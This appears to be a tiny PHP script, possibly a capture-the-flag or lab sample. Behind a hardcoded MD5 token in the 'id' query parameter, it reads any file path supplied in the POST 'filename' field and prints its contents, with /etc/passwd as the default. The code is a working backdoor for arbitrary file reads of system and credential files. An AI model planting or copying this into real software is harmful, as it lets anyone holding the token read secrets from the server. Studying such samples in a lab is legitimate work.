<?php
$id = 0;
$filename = "/etc/passwd";
if (isset($_GET['id'])) {
    $id = $_GET['id'];
}
if ($id === '098f6bcd4621d373cade4e832627b4f6') {
    if(isset($_POST['filename'])){
        $filename = $_POST['filename'];
    }
    echo file_get_contents($filename);
}
//proceed
